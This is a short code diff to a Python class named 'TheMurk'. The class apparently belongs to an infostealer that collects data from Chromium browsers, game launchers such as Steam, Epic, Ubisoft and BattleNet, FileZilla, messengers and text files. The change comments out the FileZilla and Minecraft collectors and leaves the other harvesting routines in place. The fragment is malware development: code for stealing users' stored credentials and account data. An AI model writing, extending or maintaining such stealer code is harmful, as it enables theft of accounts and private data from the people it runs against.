@@ -36,7 +36,7 @@ class TheMurk:
             self.msgInfo[1] += Grab()
         else:
             TxtFiles()
-        FileZilla()
+        # FileZilla()
     
     def Browsers(self):
         self.msgInfo[1] += Chromium()
@@ -47,7 +47,7 @@ class TheMurk:
         self.msgInfo[1] += Steam()
         self.msgInfo[1] += Epic()
         self.msgInfo[1] += Ubisoft()
-        self.msgInfo[1] += Minecraft()
+        # self.msgInfo[1] += Minecraft()
         self.msgInfo[1] += BattleNet()
     
     def Messagers(self):
